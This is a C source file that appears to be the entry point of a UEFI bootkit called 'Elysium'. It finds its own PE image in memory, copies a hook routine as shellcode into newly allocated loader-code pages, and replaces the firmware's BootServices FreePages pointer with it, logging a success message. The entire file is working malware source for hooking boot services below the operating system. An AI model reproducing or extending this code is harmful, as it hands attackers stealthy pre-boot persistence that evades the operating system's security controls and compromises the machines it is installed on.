#include "EfiMain.h"

/*!
 *
 * Purpose:
 *
 * Entry point for the Elysium.
 * Copies itself as shellcode into a newly allocated memory
 * region and places an inline hook on FreePages.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable )
{
    UINT64                      Len = 0;
    UINT64                      Pgs = 0;
    EFI_PHYSICAL_ADDRESS        Epa = 0;

    PGENTBL                     Gen = NULL;
    PIMAGE_DOS_HEADER           Dos = NULL;
    PIMAGE_NT_HEADERS           Nth = NULL;

    /* Use our label to the general table */
    Gen = C_PTR( G_PTR( GenTbl ) );

    /* Align to the start of the section */
    Dos = C_PTR( G_PTR( EfiMain ) & ~ EFI_PAGE_MASK );

    do 
    {
        /* Has the DOS magic? */
        if ( Dos->e_magic == IMAGE_DOS_SIGNATURE )
        {
            /* Retrieve a pointer to the NT headers */
            Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

            /* Has the NT magic? */
            if ( Nth->Signature == IMAGE_NT_SIGNATURE ) 
            {
                /* Leave! */
                break;
            }
        }
        /* Step back to the previus page */
        Dos = C_PTR( U_PTR( Dos ) - EFI_PAGE_SIZE );
    } while ( TRUE );

    /* Calculate the length of the shellcode */
    Len = U_PTR( G_PTR( G_END( ) ) - G_PTR( FreePagesHook ) );

    /* Calculate the number of pages needed for allocation */
    Pgs = U_PTR( ( Len >> EFI_PAGE_SHIFT ) + ( ( Len & EFI_PAGE_MASK ) ? 1 : 0 ) );

    /* Allocate new pages for shellcode */
    if ( SystemTable->BootServices->AllocatePages( AllocateAnyPages, EfiLoaderCode, Pgs, &Epa ) == EFI_SUCCESS )
    {
        /* Save reference to the system table */
        Gen->SystemTable = C_PTR( SystemTable );

        /* Save the original routine address */
        Gen->FreePages = C_PTR( SystemTable->BootServices->FreePages );

        /* Inject the shellcode into allocated pages */
        for ( INT Ofs = 0 ; Ofs < Len ; ++Ofs )
        {
            *( PUINT8 )( C_PTR( U_PTR( Epa ) + Ofs ) ) = *( PUINT8 )( C_PTR( U_PTR( G_PTR( FreePagesHook ) + Ofs ) ) );
        }

        /* Install inline hook into system table */
        SystemTable->BootServices->FreePages = C_PTR( U_PTR( Epa ) );

        /* Display success message */
        LOG( L"Elysium has been successfully loaded" );
        SLEEP( 5000 );

        return EFI_SUCCESS;
    }
    /* Failure */
    return EFIERR( 0x100 );
}
